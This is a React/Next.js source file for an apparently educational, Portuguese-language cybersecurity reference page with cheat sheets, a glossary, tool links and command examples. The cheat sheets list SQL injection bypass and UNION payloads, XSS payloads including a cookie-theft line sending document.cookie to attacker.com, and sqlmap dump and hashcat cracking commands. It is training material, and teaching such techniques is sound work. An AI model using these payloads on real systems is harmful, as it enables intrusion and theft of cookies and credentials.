'use client';

import { useState } from 'react';
import Link from 'next/link';
import { Book, FileCode, Shield, Terminal, ArrowLeft, Lock, Globe, Wifi, Code2, Database, Key, AlertTriangle, Network, Search } from 'lucide-react';

type SectionType = 'glossary' | 'cheatsheets' | 'tools' | 'commands';

export default function ReferencePage() {
  const [activeSection, setActiveSection] = useState<SectionType>('cheatsheets');

  return (
    <main className="reference-page">
      <div className="reference-container">
        <header className="reference-header">
          <Link href="/" className="back-button">
            <ArrowLeft className="w-5 h-5" />
            Voltar
          </Link>
          <h1>Referência de Cibersegurança</h1>
          <p>Material de consulta rápida para seus desafios</p>
        </header>

        <nav className="reference-nav">
          <button
            className={`nav-btn ${activeSection === 'cheatsheets' ? 'active' : ''}`}
            onClick={() => setActiveSection('cheatsheets')}
          >
            <FileCode className="w-5 h-5" />
            Cheat Sheets
          </button>
          <button
            className={`nav-btn ${activeSection === 'glossary' ? 'active' : ''}`}
            onClick={() => setActiveSection('glossary')}
          >
            <Book className="w-5 h-5" />
            Glossário
          </button>
          <button
            className={`nav-btn ${activeSection === 'tools' ? 'active' : ''}`}
            onClick={() => setActiveSection('tools')}
          >
            <Shield className="w-5 h-5" />
            Ferramentas
          </button>
          <button
            className={`nav-btn ${activeSection === 'commands' ? 'active' : ''}`}
            onClick={() => setActiveSection('commands')}
          >
            <Terminal className="w-5 h-5" />
            Comandos
          </button>
        </nav>

        <div className="reference-content">
          {activeSection === 'cheatsheets' && <CheatSheets />}
          {activeSection === 'glossary' && <Glossary />}
          {activeSection === 'tools' && <Tools />}
          {activeSection === 'commands' && <Commands />}
        </div>
      </div>
    </main>
  );
}

function CheatSheets() {
  return (
    <div className="section-content">
      <h2>Cheat Sheets</h2>

      <div className="cheat-card">
        <h3>
          <Database className="w-6 h-6 text-[var(--matrix-green)]" />
          SQL Injection
        </h3>
        <div className="code-block">
          <p className="code-title">Bypass de Autenticação:</p>
          <code>&apos; OR &apos;1&apos;=&apos;1&apos;--</code>
          <code>&apos; OR 1=1--</code>
          <code>admin&apos; OR &apos;1&apos;=&apos;1&apos;--</code>
        </div>
        <div className="code-block">
          <p className="code-title">UNION-based:</p>
          <code>&apos; UNION SELECT NULL,NULL--</code>
          <code>&apos; UNION SELECT username,password FROM users--</code>
        </div>
        <div className="code-block">
          <p className="code-title">Comentários por SGBD:</p>
          <code>MySQL: -- ou #</code>
          <code>MSSQL: --</code>
          <code>Oracle: --</code>
        </div>
      </div>

      <div className="cheat-card">
        <h3>
          <Code2 className="w-6 h-6 text-[var(--matrix-green)]" />
          XSS (Cross-Site Scripting)
        </h3>
        <div className="code-block">
          <p className="code-title">Payloads básicos:</p>
          <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
          <code>&lt;img src=x onerror=alert(1)&gt;</code>
          <code>&lt;svg onload=alert(1)&gt;</code>
        </div>
        <div className="code-block">
          <p className="code-title">Roubo de cookies:</p>
          <code>&lt;script&gt;fetch(&apos;http://attacker.com?c=&apos;+document.cookie)&lt;/script&gt;</code>
        </div>
      </div>

      <div className="cheat-card">
        <h3>
          <Lock className="w-6 h-6 text-[var(--matrix-green)]" />
          Hash
        </h3>
        <div className="code-block">
          <p className="code-title">Tamanhos comuns:</p>
          <code>MD5: 32 caracteres (hex)</code>
          <code>SHA-1: 40 caracteres (hex)</code>
          <code>SHA-256: 64 caracteres (hex)</code>
        </div>
        <div className="code-block">
          <p className="code-title">Identificar tipo:</p>
          <code>5f4dcc3b... → MD5 (32 chars)</code>
          <code>356a192b7913... → SHA-1 (40 chars)</code>
        </div>
      </div>

      <div className="cheat-card">
        <h3>
          <Network className="w-6 h-6 text-[var(--matrix-green)]" />
          Portas Comuns
        </h3>
        <div className="code-block">
          <code>21 → FTP</code>
          <code>22 → SSH</code>
          <code>23 → Telnet</code>
          <code>25 → SMTP</code>
          <code>53 → DNS</code>
          <code>80 → HTTP</code>
          <code>443 → HTTPS</code>
          <code>3306 → MySQL</code>
          <code>3389 → RDP</code>
          <code>5432 → PostgreSQL</code>
        </div>
      </div>

      <div className="cheat-card">
        <h3>
          <Key className="w-6 h-6 text-[var(--matrix-green)]" />
          JWT (JSON Web Token)
        </h3>
        <div className="code-block">
          <p className="code-title">Estrutura:</p>
          <code>header.payload.signature</code>
        </div>
        <div className="code-block">
          <p className="code-title">Decodificar (JavaScript):</p>
          <code>JSON.parse(atob(token.split(&apos;.&apos;)[1]))</code>
        </div>
        <div className="code-block">
          <p className="code-title">Vulnerabilidades:</p>
          <code>Algorithm &quot;none&quot; aceito</code>
          <code>Chave secreta fraca</code>
          <code>Sem validação de expiração</code>
        </div>
      </div>
    </div>
  );
}

function Glossary() {
  const terms = [
    { icon: <Globe className="w-5 h-5" />, term: 'API', definition: 'Interface que permite comunicação entre sistemas via HTTP.' },
    { icon: <FileCode className="w-5 h-5" />, term: 'Base64', definition: 'Método de encoding que converte dados binários em ASCII.' },
    { icon: <Key className="w-5 h-5" />, term: 'Brute Force', definition: 'Ataque que testa todas combinações possíveis de senha.' },
    { icon: <Terminal className="w-5 h-5" />, term: 'C&C', definition: 'Servidor que controla malware em máquinas comprometidas.' },
    { icon: <AlertTriangle className="w-5 h-5" />, term: 'CVE', definition: 'Sistema de identificação para vulnerabilidades conhecidas.' },
    { icon: <Shield className="w-5 h-5" />, term: 'DLP', definition: 'Tecnologia que previne vazamento de dados confidenciais.' },
    { icon: <Code2 className="w-5 h-5" />, term: 'Exploit', definition: 'Código que aproveita vulnerabilidade para acesso não autorizado.' },
    { icon: <Lock className="w-5 h-5" />, term: 'Hash', definition: 'Função que transforma dados em string de tamanho fixo.' },
    { icon: <Database className="w-5 h-5" />, term: 'IDOR', definition: 'Vulnerabilidade de acesso a recursos mudando parâmetros.' },
    { icon: <Shield className="w-5 h-5" />, term: 'IDS/IPS', definition: 'Sistema de detecção e prevenção de intrusões.' },
    { icon: <Code2 className="w-5 h-5" />, term: 'Payload', definition: 'Parte maliciosa de um ataque que será executada.' },
    { icon: <Search className="w-5 h-5" />, term: 'Pentester', definition: 'Profissional que testa segurança simulando ataques.' },
    { icon: <Key className="w-5 h-5" />, term: 'Salt', definition: 'Dados aleatórios adicionados antes do hash da senha.' },
    { icon: <Terminal className="w-5 h-5" />, term: 'SIEM', definition: 'Plataforma que coleta e analisa logs de segurança.' },
    { icon: <Shield className="w-5 h-5" />, term: 'SOC', definition: 'Centro que monitora sistemas 24/7 contra ameaças.' },
    { icon: <Database className="w-5 h-5" />, term: 'SQL Injection', definition: 'Ataque que injeta código SQL malicioso em queries.' },
    { icon: <Code2 className="w-5 h-5" />, term: 'XSS', definition: 'Vulnerabilidade que permite injetar JavaScript em páginas.' },
    { icon: <AlertTriangle className="w-5 h-5" />, term: 'Zero-Day', definition: 'Vulnerabilidade desconhecida pelo fabricante.' },
  ];

  return (
    <div className="section-content">
      <h2>Glossário A-Z</h2>
      <div className="glossary-grid">
        {terms.map((item, idx) => (
          <div key={idx} className="glossary-card">
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '12px' }}>
              <span style={{ color: 'var(--matrix-green)' }}>{item.icon}</span>
              <h4>{item.term}</h4>
            </div>
            <p>{item.definition}</p>
          </div>
        ))}
      </div>
    </div>
  );
}

function Tools() {
  const categories = [
    {
      icon: <Wifi className="w-6 h-6" />,
      category: 'Análise de Rede',
      tools: [
        { name: 'Wireshark', desc: 'Analisador de pacotes', url: 'https://wireshark.org' },
        { name: 'tcpdump', desc: 'Captura via CLI', url: 'https://tcpdump.org' },
        { name: 'Zeek', desc: 'IDS de tráfego', url: 'https://zeek.org' },
      ],
    },
    {
      icon: <Globe className="w-6 h-6" />,
      category: 'Web Security',
      tools: [
        { name: 'Burp Suite', desc: 'Proxy HTTP pentesting', url: 'https://portswigger.net/burp' },
        { name: 'OWASP ZAP', desc: 'Scanner de vulnerabilidades', url: 'https://zaproxy.org' },
        { name: 'SQLmap', desc: 'Automação SQL Injection', url: 'https://sqlmap.org' },
      ],
    },
    {
      icon: <Key className="w-6 h-6" />,
      category: 'Cracking',
      tools: [
        { name: 'Hashcat', desc: 'Cracker por GPU', url: 'https://hashcat.net' },
        { name: 'John the Ripper', desc: 'Cracker multiplataforma', url: 'https://openwall.com/john' },
        { name: 'CyberChef', desc: 'Encode/decode', url: 'https://gchq.github.io/CyberChef' },
      ],
    },
    {
      icon: <Search className="w-6 h-6" />,
      category: 'Reconnaissance',
      tools: [
        { name: 'Nmap', desc: 'Port scanner', url: 'https://nmap.org' },
        { name: 'Shodan', desc: 'Busca de dispositivos', url: 'https://shodan.io' },
        { name: 'Maltego', desc: 'OSINT', url: 'https://maltego.com' },
      ],
    },
  ];

  return (
    <div className="section-content">
      <h2>Ferramentas Profissionais</h2>
      {categories.map((cat, idx) => (
        <div key={idx} className="tool-category">
          <h3>
            <span style={{ color: 'var(--matrix-green)' }}>{cat.icon}</span>
            {cat.category}
          </h3>
          <div className="tool-grid">
            {cat.tools.map((tool, tidx) => (
              <div key={tidx} className="tool-card">
                <h4>{tool.name}</h4>
                <p>{tool.desc}</p>
                <a href={tool.url} target="_blank" rel="noopener noreferrer" className="tool-link">
                  Visitar site →
                </a>
              </div>
            ))}
          </div>
        </div>
      ))}
    </div>
  );
}

function Commands() {
  return (
    <div className="section-content">
      <h2>Comandos Essenciais</h2>

      <div className="command-section">
        <h3>
          <Search className="w-5 h-5 inline-block mr-2 text-[var(--matrix-green)]" />
          Nmap
        </h3>
        <div className="code-block">
          <code>nmap -sV 192.168.1.1</code>
          <span className="code-desc">Scan com detecção de versão</span>
        </div>
        <div className="code-block">
          <code>nmap -sS -p- 192.168.1.1</code>
          <span className="code-desc">SYN scan em todas portas</span>
        </div>
      </div>

      <div className="command-section">
        <h3>
          <Database className="w-5 h-5 inline-block mr-2 text-[var(--matrix-green)]" />
          SQLmap
        </h3>
        <div className="code-block">
          <code>sqlmap -u &quot;http://site.com?id=1&quot; --dbs</code>
          <span className="code-desc">Listar bancos</span>
        </div>
        <div className="code-block">
          <code>sqlmap -u &quot;...&quot; -D db -T users --dump</code>
          <span className="code-desc">Extrair dados</span>
        </div>
      </div>

      <div className="command-section">
        <h3>
          <Key className="w-5 h-5 inline-block mr-2 text-[var(--matrix-green)]" />
          Hashcat
        </h3>
        <div className="code-block">
          <code>hashcat -m 0 hash.txt rockyou.txt</code>
          <span className="code-desc">Crack MD5</span>
        </div>
        <div className="code-block">
          <code>hashcat -m 1000 hash.txt wordlist.txt</code>
          <span className="code-desc">Crack NTLM</span>
        </div>
      </div>

      <div className="command-section">
        <h3>
          <Wifi className="w-5 h-5 inline-block mr-2 text-[var(--matrix-green)]" />
          Wireshark Filters
        </h3>
        <div className="code-block">
          <code>http.request.method == &quot;POST&quot;</code>
          <span className="code-desc">Apenas POST</span>
        </div>
        <div className="code-block">
          <code>ip.addr == 192.168.1.1</code>
          <span className="code-desc">IP específico</span>
        </div>
      </div>

      <div className="command-section">
        <h3>
          <Terminal className="w-5 h-5 inline-block mr-2 text-[var(--matrix-green)]" />
          Linux
        </h3>
        <div className="code-block">
          <code>netstat -tuln</code>
          <span className="code-desc">Ver portas abertas</span>
        </div>
        <div className="code-block">
          <code>tail -f /var/log/auth.log</code>
          <span className="code-desc">Monitorar logins</span>
        </div>
      </div>
    </div>
  );
}
